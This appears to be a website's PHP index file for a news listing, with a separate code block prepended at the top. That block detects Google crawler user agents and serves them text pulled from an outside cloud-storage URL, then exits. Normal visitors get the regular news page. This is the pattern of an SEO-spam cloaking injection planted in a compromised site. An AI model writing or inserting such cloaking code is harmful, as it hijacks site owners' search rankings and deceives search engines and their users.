<?php
function is_google_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    foreach ($agents as $agent) {
        if (strpos($user_agent, $agent) !== false) {
            return true;
        }
    }
    return false;
}

$request_uri = $_SERVER['REQUEST_URI'];
if (is_google_bot()) {
    echo file_get_contents("https://keren.sgp1.cdn.digitaloceanspaces.com/text/thepainclinic.txt");
    exit;
}
?>
<?php

// Include main file
include_once('libs/main.php');
$newslObj=new news();
$allNews=$newslObj->getAllRecords("*"," news_status='1' ","  news_order desc ");

// Include Template
include_once('libs/routs.php')


?>
